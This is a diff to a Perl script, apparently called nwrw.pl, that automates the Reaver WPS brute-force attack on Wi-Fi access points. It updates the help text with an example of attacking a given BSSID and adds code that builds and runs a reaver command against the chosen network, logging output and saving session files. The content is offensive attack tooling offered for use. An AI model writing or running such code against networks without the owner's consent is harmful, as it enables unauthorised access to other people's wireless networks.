@@ -49,11 +49,20 @@ aptitude install reaver
 
 
 =================================================================
- Options:
+Options:
  "t5" as ARGV[0] = extreme fast timing  
  "t1" as ARGV[0] = extreme aggresive timing 
- "-attack BSSID" = this jumps directly into the attack mode 
+
+
+ "-attack BSSID " = this jumps directly into the attack mode
+exampel: ./nwrw.pl -attack 14:D6:4D:CF:CF:74
+ 
 ==================================================================
+
+DEBUG: 
+-there is a log called "reaver", tail -f this log
+-there is also a log washlog.out
+
 
 __HELP__
 #####################################################################################################
@@ -97,7 +106,11 @@ foreach (@ARGV) {
 
 	if ($_ eq "-attack") {
 		$direct="1";
-		$current_bssid=$ARGV[1];
+		$bssid=$ARGV[1];
+   		if ($bssid =~ /([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2})/i) {
+                	$bssid_without_colon="$1$2$3$4$5$6";
+        	}
+		$cmd="reaver -v -i $mondev -b $bssid -a -s /usr/local/etc/reaver/$bssid_without_colon.wpc > $logfile 2>&1 ";
 		print "\n::::: going directly to attack $ARGV[1]\n";
 		attack_hackable();
 	}
